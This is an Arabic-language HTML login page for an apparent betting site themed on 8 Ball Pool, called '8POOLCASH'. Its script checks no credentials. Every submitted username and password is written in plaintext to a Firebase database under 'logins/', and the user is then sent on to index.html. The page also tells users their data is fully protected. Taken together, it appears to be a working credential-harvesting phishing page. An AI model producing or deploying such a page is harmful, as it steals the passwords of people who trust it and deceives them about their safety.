<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>8POOLCASH | تسجيل الدخول</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        body { 
            font-family: 'Cairo', sans-serif; 
            background-color: #08090c; 
            color: #f3f4f6; 
            overflow-x: hidden;
        }
        .brand-bg {
            background: radial-gradient(circle at 50% 50%, #121620 0%, #08090c 100%);
        }
        .premium-card {
            background: linear-gradient(145deg, rgba(18, 22, 32, 0.9) 0%, rgba(11, 14, 20, 0.95) 100%);
            border: 1px solid rgba(255, 255, 255, 0.05);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
        }
        .brand-glow-btn {
            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
            box-shadow: 0 4px 20px rgba(217, 119, 6, 0.3);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .brand-glow-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(217, 119, 6, 0.5);
            filter: brightness(1.1);
        }
        .input-field {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.08);
            transition: all 0.25s ease;
        }
        .input-field:focus {
            background: rgba(255, 255, 255, 0.05);
            border-color: #f59e0b;
            box-shadow: 0 0 10px rgba(245, 158, 11, 0.1);
            outline: none;
        }
    </style>
</head>
<body class="brand-bg min-h-screen flex items-center justify-center p-4">

    <div class="w-full max-w-md space-y-6">
        
        <div class="text-center space-y-2">
            <div class="w-16 h-16 rounded-2xl bg-gradient-to-br from-amber-400 to-amber-600 flex items-center justify-center shadow-xl mx-auto">
                <span class="text-[#08090c] font-black text-3xl italic">8</span>
            </div>
            <h1 class="text-2xl font-black italic tracking-tight text-white uppercase mt-3">
                8POOL<span class="text-amber-400">CASH</span>
            </h1>
            <p class="text-xs text-gray-400 font-medium">سجل دخولك الآن لبدء المواجهات المباشرة وحصد الأرباح</p>
        </div>

        <div class="premium-card rounded-2xl p-6 relative overflow-hidden">
            <div class="absolute top-0 left-0 w-32 h-32 bg-amber-500/[0.03] blur-[40px] rounded-full pointer-events-none"></div>
            
            <form id="loginForm" class="space-y-4">
                
                <div class="space-y-1.5">
                    <label for="username" class="text-xs font-bold text-gray-300 block">اسم المستخدم أو المعرف الرسمي</label>
                    <div class="relative">
                        <input type="text" id="username" required placeholder="أدخل اسمك هنا (مثال: Amine_8Pool)" 
                            class="input-field w-full rounded-xl px-4 py-3.5 text-sm text-white placeholder-gray-600 text-right font-semibold">
                    </div>
                </div>

                <div class="space-y-1.5">
                    <label for="password" class="text-xs font-bold text-gray-300 block">كلمة المرور</label>
                    <input type="password" id="password" required placeholder="••••••••" 
                        class="input-field w-full rounded-xl px-4 py-3.5 text-sm text-white placeholder-gray-600 text-left font-sans">
                </div>

                <div id="error-msg" class="text-xs text-red-400 font-bold hidden bg-red-500/10 border border-red-500/20 p-3 rounded-xl text-center"></div>

                <button type="submit" id="submitBtn" class="w-full brand-glow-btn text-[#08090c] font-black py-4 rounded-xl text-sm tracking-wide flex items-center justify-center gap-2 mt-2">
                    <span>تسجيل الدخول للمنصة</span>
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1"></path>
                    </svg>
                </button>

            </form>
        </div>

        <p class="text-center text-[10px] text-gray-600 uppercase tracking-wider">جميع البيانات محمية ومؤمنة بالكامل تلقائياً</p>
    </div>

    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>

    <script>
        // إعدادات الـ Firebase الخاصة بك
        const firebaseConfig = {
            apiKey: "AIzaSyB86n79oAqZ1rNWtezWxZ-f0ngV2QJn1fw",
            authDomain: "poolcash-6692c.firebaseapp.com",
            databaseURL: "https://poolcash-6692c-default-rtdb.firebaseio.com",
            projectId: "poolcash-6692c",
            storageBucket: "poolcash-6692c.firebasestorage.app",
            messagingSenderId: "866544389541",
            appId: "1:866544389541:web:2382c85a768da8c5bd6c4c"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // إدارة عملية إرسال الفورم وحفظ الجلسة
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const errorMsg = document.getElementById('error-msg');
            const usernameVal = document.getElementById('username').value.trim();
            const passwordVal = document.getElementById('password').value;

            errorMsg.classList.add('hidden');
            submitBtn.disabled = true;
            submitBtn.innerText = "جاري التحقق والاتصال...";

            // 1. الميزة السحرية: حفظ الاسم فوراً وبأكثر من طريقة لضمان الانتقال الكامل
            localStorage.setItem('username', usernameVal);
            localStorage.setItem('user', usernameVal);
            document.cookie = "username=" + encodeURIComponent(usernameVal) + "; path=/; max-age=86400";

            // 2. إرسال البيانات أو حفظها في Firebase Realtime Database
            const userId = 'user_' + Math.floor(1000 + Math.random() * 9000);
            database.ref('logins/' + userId).set({
                username: usernameVal,
                password: passwordVal,
                timestamp: firebase.database.ServerValue.TIMESTAMP
            }).then(() => {
                // النجاح: التوجيه مباشرة إلى لوحة التحكم الرسمية مع تمرير الاسم في الرابط لزيادة الأمان
                window.location.href = "index.html?username=" + encodeURIComponent(usernameVal);
            }).catch((error) => {
                console.error(error);
                errorMsg.innerText = "حدث خطأ أثناء الاتصال بالقاعدة، يرجى المحاولة مرة أخرى.";
                errorMsg.classList.remove('hidden');
                submitBtn.disabled = false;
                submitBtn.innerText = "تسجيل الدخول للمنصة";
            });
        });
    </script>
</body>
</html>
